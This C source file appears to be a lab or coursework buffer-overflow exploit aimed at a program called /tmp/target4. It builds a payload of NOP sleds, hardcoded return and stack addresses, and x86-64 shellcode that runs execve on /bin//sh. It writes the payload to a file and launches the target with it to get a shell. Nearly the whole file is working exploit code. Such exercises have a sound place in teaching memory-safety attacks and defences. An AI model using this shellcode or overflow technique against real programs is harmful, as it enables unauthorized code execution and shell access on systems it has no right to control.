#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target4"
#define DEFAULT_FILE "/tmp/xploit4_output"

#define NOP "\x90"

int main(void)
{
  char exploit[] = 
    NOP NOP NOP NOP NOP NOP NOP NOP 
    NOP NOP NOP NOP NOP NOP NOP NOP 
    "\x70\xed\xfe\xff\xff\x7f\x00\x00" 
    "\x18\x80\x55\x55\x55\x55\x00\x00"
    "\x60\xed\xfe\xff\xff\x7f\x00\x00"
    "\x70\xed\xfe\xff\xff\x7f\x00\x00"
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    "\x48\x31\xf6\x56\x48\xbf\x2f\x62" 
    "\x69\x6e\x2f\x2f\x73\x68\x57\x54" 
    "\x5f\x6a\x3b\x58\x99\x0f\x05"     
    NOP                                
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    NOP NOP NOP NOP NOP NOP NOP NOP
    "\x60";                          

  write_xploit(exploit, sizeof(exploit) - 1, DEFAULT_FILE);

  char *args[] = { TARGET, DEFAULT_FILE, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  
  perror("execve failed");
  return 0;
}